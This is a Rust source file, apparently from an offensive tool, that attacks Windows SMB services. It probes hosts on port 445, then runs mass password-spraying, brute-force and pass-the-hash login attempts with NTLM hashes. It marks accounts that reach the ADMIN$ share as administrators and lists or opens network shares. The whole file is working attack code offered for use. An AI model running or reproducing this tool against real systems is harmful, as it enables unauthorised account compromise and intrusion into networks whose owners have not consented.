use std::sync::Arc;
use crate::args::Args;

use smb::{Client, ClientConfig, UncPath};
use std::str::FromStr;
use std::net::SocketAddr;
use tokio::net::TcpStream;
use tokio::time::{Duration, timeout};
use tokio::sync::Semaphore;
use colored::Colorize;

// CHECK IF HASH OR NOT
pub fn is_hash(password: &str) -> bool {
    password.len() == 32 && password.chars().all(|c| c.is_ascii_hexdigit())
}

// CONNECT TO SHARE
pub async fn connect_share(client: &Client, server: &str, share_name: &str, username: &str, password: &str) -> Result<(), smb::Error>{
    let fin_password = if is_hash(password) {
        format!("$NTLM$:{password}")
    } else {
        password.to_string()
    };
    let target_path = UncPath::from_str(&format!(r"\\{}\{}", server, share_name)).unwrap();
    client.share_connect(&target_path, &username, fin_password).await
}

// LIST AVAILABLE SHARES
pub async fn list_shares(connection: Result<(), smb::Error>, client: &Client, server: &str) {
   match connection {
        Ok(_c) => {
            println!("[+] [{}] Enumerating shares...", server);
            match client.list_shares(server).await {
                Ok(shares) => {
                    println!("\tShares:\n\t=======");
                    for share in shares {
                        match share.netname.as_ref() {
                            Some(ob) => {
                                let share_name = String::from_utf16(&ob.data).unwrap();
                                println!("\t{}\t{}", server, share_name);
                            }
                            None => (),
                        }
                    }
                }
                Err(e) => println!("{}", e),
            }
        }
        Err(e) => eprintln!("{}", e),
    }
}

// CHECK IF SMB IS OPEN ON TARGET
pub async fn check_open(ip: &str, port: u16) -> bool {
    let address = format!("{}:{}", ip, port);
    let server: SocketAddr = match address.parse() {
        Ok(addr) => addr,
        Err(_) => return false,
    };

    let stream = TcpStream::connect(&server);
    match timeout(Duration::from_millis(500), stream).await {
        Ok(Ok(_s)) => true,
        _ => false,
    }
}

// CORE ATTACK TECHNICAL BRUTEFORCE / SPRAYING / SMART / CONNECT SHARE / LIST SHARE
pub async fn execute_auth(ip: &str, username: &str, password: &str, args: &Args, mode: &bool) {
    let client = Client::new(ClientConfig::default());
    let connection = connect_share(&client, &ip, "IPC$", &username, &password).await;
    match connection {
        Ok(_c) => {
            let is_admin = connect_share(&client, &ip, "ADMIN$", &username, &password).await.is_ok();
            if is_admin {
                println!("[+] [{}] {}:{} [{}]", ip, username, password, "ADMIN".green());
            } else {
                println!("[+] [{}] {}:{} [{}]", ip, username, password, "USER".yellow());
            }
            if args.list {
                list_shares(connection, &client, &ip).await;
            } else if let Some(ref share_target) = args.connect {
                match connect_share(&client, &ip, &share_target, &username, &password).await {
                    Ok(_c) => println!("[{}]", share_target),
                    Err(e) => println!("[-] Error: {}", e),
                }
            }
            if *mode { return };
        }
        Err(_e) => println!("[-] [{}] {}:{} [{}]", ip, username, password, "FAILED".red()),
    }
}

// CORE ATTACK DISPATCHING BRUTEFORCE / SPRAYING / SMART / CONNECT SHARE / LIST SHARE
pub async fn attack(users: Arc<Vec<String>>, passwords: Arc<Vec<String>>, targets: Arc<Vec<String>>, some_args: Arc<Args>) {
    let semaphore = Arc::new(Semaphore::new(150));
    let mut tickets = vec![];

    let is_spraying = users.len() > 1 && passwords.len() == 1;
    let is_bruteforce = users.len() == 1 && passwords.len() > 1;
    let is_smart = some_args.smart;

    if is_spraying { println!("[i] Starting spraying attack against {} users", users.len()) } 
    else if is_bruteforce { println!("[i] Starting bruteforce attack with {} passwords", passwords.len()); }
    else if is_smart {println!("[i] Starting smart attack with {} combos", users.len())}
        
    for ip in targets.iter() {
        let u = Arc::clone(&users);
        let p = Arc::clone(&passwords);
        let a = Arc::clone(&some_args);
        let ip_addr = ip.clone();
        let sem = Arc::clone(&semaphore);

        let ticket = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();

            if check_open(&ip_addr, 445).await {
                println!("[+] [{}]", ip_addr);
            
                if is_smart {
                    for (username, password) in u.iter().zip(p.iter()) {
                        execute_auth(&ip_addr, username, password, &a, &is_bruteforce).await;
                    }
                } else {
                    for username in u.iter() {
                       for password in p.iter() {
                            execute_auth(&ip_addr, username, password, &a, &is_bruteforce).await;
                       }
                    }
                }
            } else {
                return;
            }
        });

        tickets.push(ticket);

    }
    for t in tickets {
        let _ = t.await;
    }
}
